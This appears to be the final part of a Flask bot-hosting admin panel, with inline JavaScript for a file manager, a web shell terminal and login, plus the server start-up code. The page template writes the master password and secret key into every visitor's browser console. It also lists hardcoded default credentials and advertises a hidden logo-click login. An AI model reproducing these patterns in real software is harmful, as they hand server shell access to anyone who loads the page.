            ctxRename.addEventListener('click', async function() {
                const path = contextMenu.dataset.path || selectedFilePath;
                if (!path) return;
                hideContextMenu();
                const newName = await customPrompt('Enter new name:', path.split('/').pop());
                if (newName === null) return;
                if (!newName.trim()) {
                    await customAlert('Name cannot be empty.', '⚠️');
                    return;
                }
                try {
                    const res = await fetch('/api/files/rename', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ old_path: path, new_name: newName.trim() })
                    });
                    const data = await res.json();
                    if (data.success) {
                        await customAlert('Renamed.', '✅');
                        loadDirectory(currentPath);
                    } else {
                        await customAlert(data.error || 'Rename failed', '❌');
                    }
                } catch (e) {
                    // handled by interceptor
                }
            });

            ctxDownload.addEventListener('click', function() {
                const path = contextMenu.dataset.path || selectedFilePath;
                if (!path) return;
                hideContextMenu();
                window.open(`/api/files/download?path=${encodeURIComponent(path)}`, '_blank');
            });

            function customPrompt(message, defaultValue) {
                return new Promise((resolve) => {
                    const bodyHTML = `
                        <div style="text-align:center;">
                            <p style="margin-bottom:12px;">${message}</p>
                            <input type="text" id="promptInput" value="${escapeHtml(defaultValue || '')}" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
                        </div>
                    `;
                    showCustomModal('✏️', bodyHTML, [
                        { label: 'Cancel', value: null, className: 'btn-cancel' },
                        { label: 'OK', value: true, className: 'btn-confirm' }
                    ]).then((result) => {
                        if (result === null) resolve(null);
                        else {
                            const val = document.getElementById('promptInput')?.value;
                            resolve(val);
                        }
                    });
                });
            }

            window._loadDirectory = function(path) {
                hideContextMenu();
                loadDirectory(path);
            };

            document.addEventListener('click', function(e) {
                if (!contextMenu.contains(e.target)) {
                    hideContextMenu();
                }
            });

            // ---------- TAB SWITCHING ----------
            const tabBtns = document.querySelectorAll('.admin-tabs button');
            const tabContents = {
                tabAdminMenu: document.getElementById('tabAdminMenu'),
                tabUserMenu: document.getElementById('tabUserMenu'),
                tabTerminal: document.getElementById('tabTerminal'),
                tabFileManager: document.getElementById('tabFileManager')
            };

            tabBtns.forEach(btn => {
                btn.addEventListener('click', function() {
                    const tabId = this.dataset.tab;
                    tabBtns.forEach(b => b.classList.remove('active'));
                    this.classList.add('active');
                    Object.keys(tabContents).forEach(key => {
                        tabContents[key].classList.toggle('active', key === tabId);
                    });
                    if (tabId === 'tabTerminal') {
                        setTimeout(() => terminalCommand.focus(), 100);
                        if (!terminalPollInterval) {
                            startTerminalPolling();
                        }
                    }
                    if (tabId === 'tabFileManager') {
                        loadDirectory('');
                    }
                });
            });

            // ---------- TERMINAL (INTERACTIVE) ----------
            async function startTerminalPolling() {
                if (terminalPollInterval) clearInterval(terminalPollInterval);
                try {
                    await fetch('/api/terminal/start', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ password: TERM_PASSWORD })
                    });
                } catch (e) {
                    console.error('Failed to start terminal:', e);
                }
                terminalPollInterval = setInterval(async () => {
                    try {
                        const res = await fetch('/api/terminal/read');
                        const data = await res.json();
                        if (data.output) {
                            terminalOutput.innerHTML += `<span class="output">${escapeHtml(data.output)}</span>`;
                            terminalOutput.scrollTop = terminalOutput.scrollHeight;
                        }
                        isTerminalRunning = data.running;
                        termStopBtn.disabled = !isTerminalRunning;
                    } catch (e) {
                        // ignore
                    }
                }, 500);
            }

            async function sendTerminalData(data) {
                try {
                    await fetch('/api/terminal/send', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ data: data, password: TERM_PASSWORD })
                    });
                } catch (e) {
                    console.error('Failed to send terminal input:', e);
                }
            }

            async function stopTerminal() {
                try {
                    await fetch('/api/terminal/stop', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ password: TERM_PASSWORD })
                    });
                    terminalOutput.innerHTML += `<span class="prompt">[Terminal stopped]</span><br />`;
                    isTerminalRunning = false;
                    termStopBtn.disabled = true;
                    setTimeout(() => {
                        startTerminalPolling();
                    }, 500);
                } catch (e) {
                    console.error('Failed to stop terminal:', e);
                }
            }

            function clearTerminal() {
                terminalOutput.innerHTML = '<span class="prompt">$ </span>Terminal cleared.<br />';
            }

            termRunBtn.addEventListener('click', function() {
                const data = terminalCommand.value;
                if (!data) return;
                if (!isTerminalRunning) {
                    // try to start
                }
                sendTerminalData(data);
                terminalCommand.value = '';
            });

            termStopBtn.addEventListener('click', stopTerminal);
            termClearBtn.addEventListener('click', clearTerminal);

            terminalCommand.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    termRunBtn.click();
                }
            });

            // ---------- EVENT BINDINGS ----------
            loginBtn.addEventListener('click', handleLogin);
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Enter' && loginView.classList.contains('active')) {
                    handleLogin();
                }
            });

            hamburgerBtn.addEventListener('click', openAdminPanel);
            adminCloseBtn.addEventListener('click', closeAdminPanel);
            adminOverlay.addEventListener('click', function(e) {
                if (e.target === this) closeAdminPanel();
            });

            logoutBtn.addEventListener('click', handleLogout);

            toggleCreateUserBtn.addEventListener('click', function() {
                const form = document.getElementById('createUserForm');
                form.style.display = form.style.display === 'none' ? 'block' : 'none';
            });

            createUserBtn.addEventListener('click', handleCreateUser);

            // ---------- INIT ----------
            const loggedIn = {{ logged_in|tojson }};
            if (loggedIn) {
                currentUser = {
                    username: '{{ username }}',
                    role: '{{ session.get("role", "") }}'
                };
                loadBots();
                if (currentUser.role === 'admin') {
                    loadAdminUsers();
                }
            }

            function escapeHtml(str) {
                const div = document.createElement('div');
                div.textContent = str;
                return div.innerHTML;
            }

            function formatUptime(seconds) {
                if (seconds < 0) return '--';
                const d = Math.floor(seconds / 86400);
                const h = Math.floor((seconds % 86400) / 3600);
                const m = Math.floor((seconds % 3600) / 60);
                const s = Math.floor(seconds % 60);
                return `${d}d ${h}h ${m}m ${s}s`;
            }

            console.log('🔐 YUVICODEX System ready.');
            console.log('📋 Default accounts: admin/admin123 (admin), user1/pass123, user2/pass456');
            console.log('💻 Use upload to deploy bots.');
            console.log('🔑 Master Password: {{ MASTER_PASSWORD if MASTER_PASSWORD else "not set" }}');
            console.log('🔐 Secret Key: {{ SECRET_KEY if SECRET_KEY else "not set" }}');
            console.log('👉 Click logo 5 times for secret key login.');
            console.log('📡 Interactive terminal started.');
        })();
    </script>
</body>
</html>
"""

# ---------- RUN ----------
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    LOGS_DIR = os.path.join(os.path.dirname(__file__), 'logs')
    BOT_UPLOAD_DIR = os.path.join(os.path.dirname(__file__), 'upload_bots')
    REQUIREMENTS_DIR = os.path.join(os.path.dirname(__file__), 'requirements_temp')
    os.makedirs(LOGS_DIR, exist_ok=True)
    os.makedirs(BOT_UPLOAD_DIR, exist_ok=True)
    os.makedirs(REQUIREMENTS_DIR, exist_ok=True)

    print("="*60)
    print("🐍 YUVICODEX Admin Panel (Interactive Terminal)")
    print(f"🌐 Website Port: {port}")
    print("📁 Projects stored in uploads/<username>/<project_id>/")
    print("🌐 Static files served at /project/<username>/<project_id>/<filename>")
    print(f"🔑 Master Password: {MASTER_PASSWORD}")
    print(f"🔐 Secret Key: {SECRET_KEY}")
    print("👉 Login with master password or click logo 5 times for secret key.")
    print("📡 Terminal: interactive, supports stdin (e.g., pip uninstall prompts).")
    print("⏹️ Stop button kills the shell process.")
    print("="*60)
    app.run(host='0.0.0.0', port=port, debug=False)